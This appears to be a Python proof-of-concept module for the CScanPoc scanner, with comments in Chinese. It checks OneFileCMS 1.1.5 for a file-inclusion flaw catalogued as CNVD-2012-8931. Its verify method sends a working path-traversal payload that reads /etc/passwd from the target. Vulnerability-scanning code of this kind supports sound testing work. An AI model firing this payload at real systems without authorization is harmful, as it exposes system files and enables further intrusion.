# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'OneFileCMS_0002'  # 平台漏洞编号，留空
    name = 'OneFileCMS f参数文件包含漏洞'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2012-03-19'  # 漏洞公布时间
    desc = '''
        OneFileCMS是一款只有一个文件的轻量级CMS系统。
        OneFileCMS存在文件包含漏洞。由于程序未能充分过滤用户提供的输入，攻击者可以利用漏洞在web服务器进程上下文中浏览文件和执行脚本，这可能导致进一步的攻击。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2012-8931'  # 漏洞来源
    cnvd_id = 'CNVD-2012-8931'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'OneFileCMS'  # 漏洞应用名称
    product_version = '1.1.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a5203a55-6277-41b5-8696-23de0c8ee30d'
    author = '47bwy'  # POC编写者
    create_date = '2018-07-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/onefilecms.php?f=../../../../etc/passwd'
            url = self.target + payload
            r = requests.get(url)

            if 'root' in r.text and 'bin/bash' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
